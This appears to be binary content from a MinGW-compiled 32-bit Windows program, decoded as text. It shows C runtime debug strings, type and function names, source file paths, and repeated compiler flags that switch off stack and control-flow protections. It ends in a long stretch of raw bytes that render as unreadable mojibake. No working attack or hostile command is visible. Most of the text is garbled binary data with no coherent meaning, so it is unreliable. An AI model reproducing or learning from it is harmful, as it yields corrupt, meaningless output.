+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJhandlerJ$_imp___set_invalid_parameter_handlerJ$_imp___get_invalid_parameter_handlerJ#mingw_get_invalid_parameter_handlerJ#mingw_set_invalid_parameter_handlerJnew_handlerJ_InterlockedExchangePointerJ
+TargetJ
+ValueJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJ_baseJ_fileJ_charbufJ	_tmpfnameJ	_imp___iobJ_f__acrt_iob_funcJ_imp____acrt_iob_funcJ__acrt_iob_funcJindexJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ__gnuc_va_listJ__builtin_va_listJva_listJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ	CHARJ	WCHARJ	HANDLEJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJFARPROCJHINSTANCE__JunusedJ	HINSTANCEJHMODULEJdoubleJlong doubleJtagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ_imp__vsprintf_sJGetModuleHandleWJGetModuleHandleW@4J__ms_vsnprintfJGetProcAddressJGetProcAddress@8J_int_vsprintf_sJ _SizeJ"vsprintf_sJ'_SizeJ)__mingw_get_msvcrt_handleJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ	ULONG_PTRJdoubleJlong doubleJRtlSecureZeroMemoryJRtlSecureZeroMemory@8JÌ
+GNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ__gnuc_va_listJ__builtin_va_listJva_listJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJ
+_vsnprintfJ
+_vscprintfJ__ms_vsnprintfJ	formatJretvalJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJ__gnuc_va_listJ__builtin_va_listJva_listJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJfloatJsigned charJ	short intJlong long unsigned intJ
+CHARJ
+WCHARJ
+HANDLEJ!JOB_OBJECT_NET_RATE_CONTROL_FLAGSJ"JOB_OBJECT_NET_RATE_CONTROL_ENABLEJ)JOB_OBJECT_NET_RATE_CONTROL_MAX_BANDWIDTHJ$JOB_OBJECT_NET_RATE_CONTROL_DSCP_TAGJ'JOB_OBJECT_NET_RATE_CONTROL_VALID_FLAGSJFARPROCJHINSTANCE__JunusedJ	HINSTANCEJHMODULEJdoubleJlong doubleJtagCOINITBASEJCOINITBASE_MULTITHREADEDJVARENUMJVT_EMPTYJVT_NULLJVT_DATEJVT_DISPATCHJVT_ERRORJVT_BOOLJ
+VT_VARIANTJ
+VT_UNKNOWNJ
+VT_DECIMALJVT_INTJVT_UINTJ
+VT_HRESULTJVT_SAFEARRAYJ	VT_CARRAYJVT_USERDEFINEDJVT_LPSTRJ	VT_RECORDJ
+VT_INT_PTRJVT_UINT_PTRJVT_FILETIMEJ	VT_STREAMJ
+VT_STORAGEJVT_STREAMED_OBJECTJVT_STORED_OBJECTJVT_BLOB_OBJECTJVT_CLSIDJVT_VERSIONED_STREAMJVT_BSTR_BLOBJ	VT_VECTORJVT_ARRAYJVT_BYREFJVT_RESERVEDJ
+VT_ILLEGALJVT_ILLEGALMASKEDJVT_TYPEMASKJ_imp___vscprintfJGetModuleHandleWJGetModuleHandleW@4J_vsnprintfJreallocJmallocJstrlenJ
+_set_errnoJGetProcAddressJGetProcAddress@8J
+_vscprintfJ!init_vscprintfJ$__mingw_get_msvcrt_handleJ%emu_vscprintfJ	bufferJ	new_bufferJ	sizeJËGNU C17 13-win32 -m32 -masm=att -mno-omit-leaf-frame-pointer -mtune=generic -march=pentiumpro -g -O2 -fno-omit-frame-pointer -fno-stack-protector -fno-stack-clash-protection -fcf-protection=none -fno-PIEJunsigned intJshort unsigned intJlong intJlong long intJlong unsigned intJunsigned charJ
+_get_errnoJ_ValueJ	_set_errnoJ_ValueJ	SubsystemJCheckSumJSizeOfImageJ
+BaseOfCodeJSectionAlignmentJMinorSubsystemVersionJDataDirectoryJSizeOfStackCommitJ	ImageBaseJ
+SizeOfCodeJMajorLinkerVersionJSizeOfHeapReserveJSizeOfInitializedDataJSizeOfStackReserveJSizeOfHeapCommitJMinorLinkerVersionJ__enative_startup_stateJSizeOfUninitializedDataJAddressOfEntryPointJMajorSubsystemVersionJSizeOfHeadersJMajorOperatingSystemVersionJFileAlignmentJNumberOfRvaAndSizesJExceptionRecordJDllCharacteristicsJMinorImageVersionJMinorOperatingSystemVersionJLoaderFlagsJWin32VersionValueJMajorImageVersionJ__enative_startup_stateJdwReasonJ
+hDllHandleJ
+lpreservedJsSecInfoJExceptionRecordJpSectionJTimeDateStampJ	pNTHeaderJCharacteristicsJ
+pImageBaseJVirtualAddressJiSectionJ_FormatJ_ArgListJformatJarglistJ</usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/crtexe.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJ&/usr/i686-w64-mingw32/include/psdk_incJ7/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/includeJcrtexe.cJcrtexe.cJintrin-impl.hJ	corecrt.hJminwindef.hJ	basetsd.hJerrhandlingapi.hJstdlib.hJcombaseapi.hJwtypes.hJctype.hJ
+internal.hJcorecrt_startup.hJtchar.hJstring.hJ	process.hJ
+synchapi.hJ
+<built-in>J?/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/crtexewin.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJcrtexewin.cJcrtexewin.cJ	corecrt.hJminwindef.hJprocessthreadsapi.hJtchar.hJ	winbase.hJstring.hJ	mbctype.hJcorecrt_startup.hJ=/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/gccmain.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJ	gccmain.cJ	gccmain.cJcombaseapi.hJwtypes.hJ	corecrt.hJstdlib.hJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/natstart.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJ7/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/includeJ
+natstart.cJcombaseapi.hJwtypes.hJ
+internal.hJ
+natstart.cJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/wildcard.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ
+wildcard.cJ
+wildcard.cJ=/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/dllargv.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ	dllargv.cJ	dllargv.cJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/_newmode.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ
+_newmode.cJ
+_newmode.cJ/buildJ</usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/tlssup.cJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJ	corecrt.hJminwindef.hJ	basetsd.hJcorecrt_startup.hJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/xncommod.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ
+xncommod.cJ
+xncommod.cJ/buildJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/cinitexe.cJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ
+cinitexe.cJ
+cinitexe.cJ/buildJ:/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/merr.cJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/CRT_fp10.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/buildJC/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/mingw_helpers.cJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJmingw_helpers.cJmingw_helpers.cJB/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/pseudo-reloc.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJpseudo-reloc.cJpseudo-reloc.cJvadefs.hJ	corecrt.hJminwindef.hJ	basetsd.hJcombaseapi.hJwtypes.hJmemoryapi.hJstring.hJstdlib.hJerrhandlingapi.hJ
+<built-in>JA/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/usermatherr.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJusermatherr.cJusermatherr.cJ>/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/xtxtmode.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ
+xtxtmode.cJ
+xtxtmode.cJA/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/crt_handler.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJcrt_handler.cJcrt_handler.cJminwindef.hJ	basetsd.hJerrhandlingapi.hJcombaseapi.hJwtypes.hJsignal.hJ/buildJ=/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/tlsthrd.cJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJ	tlsthrd.cJ	tlsthrd.cJ	corecrt.hJminwindef.hJ	basetsd.hJminwinbase.hJ
+synchapi.hJstdlib.hJerrhandlingapi.hJprocessthreadsapi.hJ/buildJ=/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/tlsmcrt.cJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJG/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/pseudo-reloc-list.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJpseudo-reloc-list.cJpseudo-reloc-list.cJ</usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crt/pesect.cJ/buildJ/buildJ3/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/crtJ/usr/i686-w64-mingw32/includeJpesect.cJpesect.cJ	corecrt.hJminwindef.hJ	basetsd.hJstring.hJ/buildJD/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/misc/mingw_matherr.cJ/buildJ4/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/miscJmingw_matherr.cJmingw_matherr.cJB/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/secapi/sprintf_s.cJ/buildJ/buildJ6/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/secapiJ/usr/i686-w64-mingw32/includeJ%/usr/i686-w64-mingw32/include/sec_apiJsprintf_s.cJsprintf_s.cJvadefs.hJ	corecrt.hJcombaseapi.hJwtypes.hJ	stdio_s.hJ/buildJP/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/misc/invalid_parameter_handler.cJ/buildJ4/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/miscJ&/usr/i686-w64-mingw32/include/psdk_incJ/usr/i686-w64-mingw32/includeJinvalid_parameter_handler.cJinvalid_parameter_handler.cJintrin-impl.hJ	corecrt.hJstdlib.hJcombaseapi.hJwtypes.hJE/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/stdio/acrt_iob_func.cJ/buildJ/buildJ5/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/stdioJ/usr/i686-w64-mingw32/includeJacrt_iob_func.cJacrt_iob_func.cJ/buildJC/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/secapi/vsprintf_s.cJ/buildJ6/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/secapiJ7/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/includeJ/usr/i686-w64-mingw32/includeJvsprintf_s.cJvsprintf_s.cJvadefs.hJ	corecrt.hJminwindef.hJcombaseapi.hJwtypes.hJlibloaderapi.hJN/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/intrincs/RtlSecureZeroMemory.cJ/buildJ/buildJ8/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/intrincsJ/usr/i686-w64-mingw32/includeJRtlSecureZeroMemory.cJRtlSecureZeroMemory.cJ	basetsd.hJA/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/stdio/vsnprintf.cJ/buildJ/buildJ5/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/stdioJ/usr/i686-w64-mingw32/includeJvsnprintf.cJvsnprintf.cJstdarg.hJ	corecrt.hJB/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/stdio/_vscprintf.cJ/buildJ/buildJ5/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/stdioJ7/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/includeJ/usr/i686-w64-mingw32/includeJ_vscprintf.cJ_vscprintf.cJvadefs.hJ	corecrt.hJminwindef.hJcombaseapi.hJwtypes.hJstdlib.hJstring.hJlibloaderapi.hJ?/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/misc/seterrno.cJ/buildJ/buildJ4/usr/src/mingw-w64-11.0.1-3build1/mingw-w64-crt/miscJ/usr/i686-w64-mingw32/includeJ
+seterrno.cJ
+seterrno.cJ	corecrt.hZî  Z”  ZÃ  Z  Zš  ZÊ  Z÷  Z‡  Z²  ZÃ  ZÔ  Z×  ZË  ZÞ!  ZŒ  Z  ZÕ  Zÿ  ZÊ  Z  ZÄ  Z   ZÎ  Zÿ  Zà  Z¬  Z¼  ZÆ Zñ Zò Z— Z’ Z¦ Z§ ZÇ ZÈ Z Z Z‡ Zˆ ZÑ ZÒ Zù Z° ZÎ ZÙ Zß Z* Z— ZÚ ZÙ Zñ Z÷ Zü Z ZÓ Z¹ ZÈ ZŒ	 Zû	 Z‡
+ Z¡
+ Zò ZÕ Zä Zò  Z !Z "Zž #Z¬ $Z» %ZÚ &Z³ 'ZÌ 'Z¾ (Z× )Zâ *Zð +Z¶ ,Z¬ -ZÀ .ZÚ 5ZÁ 6Z½ 7Z´ 8Zü 9Zù :Z§ ;ZÑ <Z¬ <ZÔ =Z¯ =ZÜ  >Zá  ?Z¾ ½j€€€€  ( j€ €€”  (j€À€ ( j€à€  ( j€€‚€  ( j€ ‚Ü ( j€À‚€ ( j€à‚€ ( j€€ƒ€ ( j€ ƒ€  ( j€Àƒ€  ( j€àƒ€„  ( j€€‡€L  ( j€à‡€D  ( j€Àˆ€  ( j€àˆ€8  ( j€ ‰€   ( j€À‰€  ( z€€€zü«‚zø«‚zô«‚z
+¼€€z€€z€€zŒ ‚zˆ¬‚zœ¬‚z„¬‚zœÀz#˜€z(„‚€z*ø‚€z/€Šz4ô€z6è‚€z>ð«‚z?„ ‚z@„ ‚zAì«‚zB” ‚zD˜ ‚zEœ ‚zT€Å‚z^ä«‚zaè«‚zeè«‚zhˆ ‚ziè«‚znôäzw°•zxüÄ‚zz ¬‚z{€ €z~œ ‚z‚˜ ‚z¡˜ ‚z£” ‚z¤˜Å‚z§˜ ‚z©œ ‚z¬Œ ‚z­ ‚z°ˆ ‚z»è«‚zÁè«‚zÄˆà‚zÅ€à‚zÇè«‚zÊä«‚zÍ ‚zÖè«‚z×”à‚zØŒà‚zßˆ¬‚zñ€àzòÐÄ‚z÷€àzøøÄ‚zùÜÄ‚zû  ‚zü“àz©àz…€Àzˆ¤ ‚z‰œ‚‚z‹°©€z“Ø¥z”Ð¥z™€Àzœœ‚‚zž  ‚z¢´Ä‚zÐÀ ‚zÑÀ ‚zèèÄ‚zñÄÄ‚zÿ€Ä‚zˆ¸Ä‚zÞìÄ‚zÓÄàz× ÀzÿÀ ‚z…À ‚zŒÀ ‚z“ «‚z”¡«‚z•¢«‚z–£«‚zœÎàz «‚zµÀ ‚zÃ¼Ä‚zÆØÄ‚z§À ‚zÿìÄ‚z„èÄ‚z‰ÄÄ‚z¹Øàz½ ÀzÈêàzÌ Àz‡	€Å‚zŒ	ùàz	¬Ä‚z“	Ä ‚z	°Ä‚z¦	¨Ä‚z©	€£‚z«	ÈÄ‚z®	€£‚z³	€£‚zÀ	à ‚zÁ	”Ä‚zÅ	€£‚zÌ	€£‚zÌ	£‚zÏ	ìÄ‚zû	ÿàzÿ	 Àz‡
+‰áz‹
+ Àz¡
+›áz¥
+ Àz„¤áz…¬Ä‚z°¬Ä‚zÎ Ä‚zÕ°Ä‚zÞ¨Ä‚zå°Ä‚zî¨Ä‚zñ¼Ä‚zôØÄ‚zÁìÄ‚zò§ázö Àz™èÄ‚zžÄÄ‚zÃ€Ä‚zß¸Ä‚z—äÄ‚z§˜Ä‚zº”Ä‚z½ìÄ‚zÕ´áz×ˆÄ‚zääázæŒÄ‚zë„Ä‚zòŒâzôˆÄ‚z¾âzƒŒÄ‚zˆ„Ä‚zÐâz‘ˆÄ‚zž„ãz ŒÄ‚z¥„Ä‚z¬”ãz®ˆÄ‚z»Êãz½ŒÄ‚zÂ„Ä‚zÅ¼Ä‚zÈØÄ‚z×ìÄ‚zÚÒãzÞ Àz³äãzµˆÄ‚z¾žäzÀŒÄ‚zÅ„Ä‚zÌäãzÎˆÄ‚z×­äzÙŒÄ‚zÞ„Ä‚zêœÆ‚zóÐÄ‚zøà ‚zûÌÄ‚zþà ‚z€Æ«‚zÄ«‚z‚Å«‚zèÄ‚zšÄÄ‚z¨€Ä‚z²¸Ä‚zïà ‚zŽÄ ‚zÄ ‚zÄ ‚z£Ä ‚zªÄ ‚z³Ä ‚z·È ‚z½ìÄ‚zâÄäzðÕäzô Àz¶çäz·¬Ä‚z½Ä ‚zÇ°Ä‚zÐ¨Ä‚zÜ€«‚zääÄ‚zý¼Ä‚z€ØÄ‚zïÈ ‚z„È ‚z–¨Æ‚z´ŒÀzµ€²z½ŒÀz¾„²z¿„²zÀŒÀzÊð±zÑì±zÔÀ†zÝô±zÝø±záà«‚zåà«‚z˜Àz„˜Àz¬à‚zŽ¬à‚z‘¬à‚z–¬à‚z¬åz³¬çzÀ åzÚÄçzë¬‚zî”¬‚z‚”¬‚z‰”¬‚zŒÅ‚z›¬‚z¨”¬‚z¯ˆÅ‚z³ÀÄ‚z´´èz¹”¬‚z½€èzÁàçzÉŒ¬‚zÒŒ¬‚zÙ¬‚zÝ”¬‚zÞÐðzßÐðzâÐðzåÐðzæÐðzæÜðzéÔðzìØðzðÐðz÷€€€z‡€€€z‰Ððz‹àðz‹ìðzŒ€€€zŽÜðzŽèðz€€€z€€€z’äðz’ððzš€€€z Üðz§¼éz«Ôðz¬Üðz®Øðz°Ððz²€€€zÃ€€€zÄÐðzÊ€€€zÌÐðzÍÐðzÑÔðzÑÜðzÒÐðzÒØðzÔ€€€zÕ€€€z×€€€zØÐðzÛ¬‚zÞˆÅ‚zá”¬‚zð¬‚zùézüÜèzƒ˜¬‚zœ ¬‚zâ¬¬‚zã¤Ä‚zä¤¬‚zè„Å‚zïÀÄ‚zú¬¬‚zûôÄ‚zƒ¨¬‚z–¬¬‚z—¤Ä‚z˜¤¬‚z™¤¬‚zœ¬¬‚zôÄ‚z©¨¬‚z±¬¬‚z²¤Ä‚z³¤¬‚zÆ¬¬‚zÇôÄ‚zÍ¤¬‚zÙ¨¬‚zÜ¨¬‚zã¨¬‚zè¨¬‚zë¨¬‚zî¤¬‚zø¤¬‚zù¨¬‚zú¬¬‚zûœÄ‚z…¬¬‚z†ðÄ‚zÄ€€€zÆ¼€€zÇ€€zÈ€€zÊ˜€zÌ”€zÍ†€zÎø‚€zÙø‚€zÙ ƒ€zßø‚€zî€€€zð¼€€zñ€€zò€€zõ˜€zø”€zùø‚€zü†€zÿ€€€z„„ƒ€z„¬ƒ€z‡€ƒ€z”€€€z–¼€€z—€€zš˜€zœ†€z €€€z¥¼€€z¦€€z§€€z¬˜€z®”€z¯†€z°ø‚€zµŸƒ€zµÇƒ€zÃ€€€zÅ¼€€zÆ€€zÉ˜€zÊ€€€zË€€€zÎ€€€zÐ¼€€zÑ€€zÒ€€zÖ˜€zÙ”€zÚø‚€zß†€zà€€€zå„ƒ€zå¬ƒ€zè€ƒ€zõœƒ€zÿ€€€z†¼€€z‡€€zˆ€€z˜€€z˜€z’€€z’€‚€z•”€z–†€z—ø‚€z›„ƒ€z›¬ƒ€zž€ƒ€z¬€€€z°„€€z°˜€€z°„À‚z°˜À‚z³Œ€€z³ŒÀ‚z¸Œ€€z¸ŒÀ‚z¼€€€z¾üÓ‚zæØ¬‚zëØ¬‚zóÀÅ‚zš°ÀzŸ©z¬êz­ÔÄ‚z¯¦êz±ÜÄ‚z²€©z·°Àz¿°ÀzÄ©zÑêzÒÔÄ‚zÔ¦êzÖÜÄ‚z×€©zÜ°ÀzÜ ´êzÝ ÔÄ‚zá Êêzã ÜÄ‚zç ´Àzï À¬zÕ!àÄ‚zÛ!ðäzÞ!€€€zé!ðä
